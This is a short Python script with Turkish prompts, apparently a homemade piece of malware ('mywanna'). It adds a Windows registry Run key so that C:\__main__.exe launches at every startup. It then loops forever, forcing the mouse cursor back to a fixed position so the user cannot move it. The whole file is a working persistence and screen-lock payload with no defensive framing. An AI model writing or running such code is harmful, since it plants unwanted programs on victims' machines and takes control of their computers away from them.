import os
import pyautogui
import time
konum = pyautogui.position()
#import subprocess
#path = pwd + name.py
#dene = "python " + str(os.system("pwd")) + "/" + "mywanna.py"

bir = "@echo off"
iki = "reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v trregen /t reg_sz /d C:\__main__.exe"
print "__main__ dosyasinin C:\'de olduguna emin misin? Enter-la"
os.system(bir)
os.system(iki)

while True:
	while True:
		if konum != pyautogui.position():
			pyautogui.moveTo(konum)
